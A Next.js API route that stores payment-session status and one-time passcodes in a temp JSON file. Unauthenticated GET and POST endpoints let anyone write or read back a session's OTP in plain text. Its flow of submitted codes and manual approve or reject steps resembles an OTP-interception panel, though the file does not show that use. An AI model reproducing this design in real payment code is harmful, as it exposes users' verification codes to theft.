import { NextRequest, NextResponse } from 'next/server';
import fs from 'fs';

const STATE_FILE = '/tmp/payment-state.json';

interface PaymentState {
  [sessionId: string]: {
    status: 'pending' | 'otp_requested' | 'approved' | 'rejected' | 'otp_error' | 'otp_submitted';
    otpCode?: string;
    timestamp: number;
  };
}

function getState(): PaymentState {
  try {
    if (fs.existsSync(STATE_FILE)) {
      const data = fs.readFileSync(STATE_FILE, 'utf8');
      return JSON.parse(data);
    }
  } catch (error) {
    console.error('Error reading state:', error);
  }
  return {};
}

function setState(state: PaymentState) {
  try {
    fs.writeFileSync(STATE_FILE, JSON.stringify(state, null, 2));
  } catch (error) {
    console.error('Error writing state:', error);
  }
}

export async function GET(request: NextRequest) {
  try {
    const { searchParams } = new URL(request.url);
    const sessionId = searchParams.get('sessionId');

    if (!sessionId) {
      return NextResponse.json({ error: 'Session ID is required' }, { status: 400 });
    }

    const state = getState();
    const sessionData = state[sessionId];

    if (!sessionData) {
      return NextResponse.json({ status: 'not_found' });
    }

    // Проверяем, не истек ли срок действия (1 час)
    const now = Date.now();
    if (now - sessionData.timestamp > 60 * 60 * 1000) {
      delete state[sessionId];
      setState(state);
      return NextResponse.json({ status: 'expired' });
    }

    return NextResponse.json({
      status: sessionData.status,
      otpCode: sessionData.otpCode
    });
  } catch (error) {
    console.error('Error getting payment status:', error);
    return NextResponse.json({ error: 'Internal server error' }, { status: 500 });
  }
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    const { sessionId, status, otpCode } = body;

    if (!sessionId || !status) {
      return NextResponse.json({ error: 'Session ID and status are required' }, { status: 400 });
    }

    const state = getState();
    
    if (!state[sessionId]) {
      state[sessionId] = {
        status: 'pending',
        timestamp: Date.now()
      };
    }

    state[sessionId].status = status;
    state[sessionId].timestamp = Date.now();
    
    if (otpCode) {
      state[sessionId].otpCode = otpCode;
    }

    setState(state);

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error('Error updating payment status:', error);
    return NextResponse.json({ error: 'Internal server error' }, { status: 500 });
  }
} 